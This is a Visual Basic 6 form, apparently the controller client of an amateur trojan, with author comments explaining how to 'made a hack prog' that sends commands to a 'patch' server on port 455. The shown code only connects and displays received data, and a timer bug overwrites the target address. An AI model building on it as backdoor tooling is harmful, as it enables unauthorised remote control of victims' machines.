VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Begin VB.Form Form1 
   Caption         =   "Form1"
   ClientHeight    =   4815
   ClientLeft      =   60
   ClientTop       =   345
   ClientWidth     =   5805
   LinkTopic       =   "Form1"
   ScaleHeight     =   4815
   ScaleWidth      =   5805
   StartUpPosition =   3  'Windows Default
   Begin VB.Timer Timer1 
      Interval        =   1
      Left            =   240
      Top             =   0
   End
   Begin MSWinsockLib.Winsock Winsock1 
      Left            =   720
      Top             =   0
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin VB.CommandButton Command2 
      Caption         =   "Disconnect"
      Enabled         =   0   'False
      Height          =   255
      Left            =   2160
      TabIndex        =   2
      Top             =   720
      Width           =   975
   End
   Begin VB.CommandButton Command1 
      Caption         =   "Connect"
      Height          =   255
      Left            =   2160
      TabIndex        =   1
      Top             =   480
      Width           =   975
   End
   Begin VB.TextBox Text1 
      Height          =   495
      Left            =   240
      TabIndex        =   0
      Top             =   480
      Width           =   1815
   End
   Begin VB.Label Label1 
      Height          =   255
      Left            =   240
      TabIndex        =   3
      Top             =   1080
      Width           =   1815
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
''''''''''' Gadi Elishayov ''''''''''
' Main Things '
' So Here Here It Is
' You Allways Dremt To Made A Hack Prog
' So I Explaine How It Work
' It's Very Very Ease
' You Connect To Him And Send Him Data
' He's Getting The Data And Check It
' With If Sentences
' And You Tell Him To Do That When You Send Him That
' Don't Forget To Check The Patch.vbp File Project!
' So If You Don't Understand Send Me Email
' To opman@newmail.net
' Or Come To My Site For Great Program
' www.gadihomepage.com
' I Am From Israel
' Bye Bye By The Legend: Gadi Elishayov.

Private Sub Command1_Click()
' allways put a on error sign on a button beacuse if he
' click and he's not connect some thing ain't gonna work!
On Error GoTo error
'alwalys close if there a before connection
Winsock1.Close
' connect
' 455 is the port the patch is work on the same port
Winsock1.Connect Text1.Text, 455
Command1.Enabled = False
Command2.Enabled = True
' here it's go when there is a error end he exit sub
' it mean's (do nothing)
error:
Exit Sub
End Sub

Private Sub Command2_Click()
'the same thing with errors
' and all the bull shit!
On Error GoTo error
Winsock1.Close
Command2.Enabled = False
Command1.Enabled = True
error:
Exit Sub
End Sub

Private Sub Timer1_Timer()
' i put this timer to let the user know if he connect!
' read and understand the code
Text1.Text = Winsock1.LocalIP
If Winsock1.State = 0 Then Label1.Caption = "Status: Closed"
If Winsock1.State = 1 Then Label1.Caption = "Status: Open"
If Winsock1.State = 2 Then Label1.Caption = "Status: Listening"
If Winsock1.State = 3 Then Label1.Caption = "Status: Connection Pending"
If Winsock1.State = 4 Then Label1.Caption = "Status: Resolving Host"
If Winsock1.State = 5 Then Label1.Caption = "Status: Host Resolved"
If Winsock1.State = 6 Then Label1.Caption = "Status: Connecting"
If Winsock1.State = 7 Then Label1.Caption = "Status: Connected"
If Winsock1.State = 8 Then Label1.Caption = "Status: No Carrier"
If Winsock1.State = 9 Then Label1.Caption = "Status: Error"
End Sub

Private Sub Winsock1_DataArrival(ByVal bytesTotal As Long)
On Error GoTo error
' here all the thing working (read "main thing" up there)
' it's dim a string calls strdata
Dim strData As String
' it's stores the data that sended in this
    Winsock1.GetData strData, vbString
' it's msgbox it!
MsgBox (strData)
error:
Exit Sub
End Sub
